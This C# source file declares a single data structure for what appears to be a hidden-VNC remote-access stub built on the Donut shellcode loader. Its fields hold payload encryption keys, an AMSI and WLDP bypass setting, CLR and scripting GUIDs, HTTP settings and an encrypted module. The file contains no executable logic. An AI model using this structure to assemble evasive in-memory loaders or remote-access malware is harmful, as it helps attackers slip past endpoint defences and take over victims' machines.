using System;
using System.Runtime.InteropServices;

namespace ShitarusPrivate.HVNC.StubUtils.Donut.Structs
{
    public struct DSInstance
    {
        public uint len;

        public DSCrypt key;

        public ulong iv;

        public API api;

        public int api_cnt;

        public int dll_cnt;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public DLL[] d;

        public AMSI amsi;

        public int bypass;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] clr;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public char[] wldp;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
        public char[] wldpQuery;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
        public char[] wldpIsApproved;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public char[] amsiInit;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public char[] amsiScanBuf;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public char[] amsiScanStr;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public char[] wscript;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
        public char[] wscript_exe;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_IUnknown;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_IDispatch;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xCLSID_CLRMetaHost;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_ICLRMetaHost;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_ICLRRuntimeInfo;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xCLSID_CorRuntimeHost;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_ICorRuntimeHost;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_AppDomain;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xCLSID_ScriptLanguage;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_IHost;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_IActiveScript;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_IActiveScriptSite;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_IActiveScriptSiteWindow;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_IActiveScriptParse32;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_IActiveScriptParse64;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xCLSID_DOMDocument30;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_IXMLDOMDocument;

        [MarshalAs(UnmanagedType.Struct)]
        public Guid xIID_IXMLDOMNode;

        public int type;

        public DSHttp http;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
        public char[] sig;

        public ulong mac;

        public DSCrypt mod_key;

        public ulong mod_len;

        public MODULE module;
    }
}
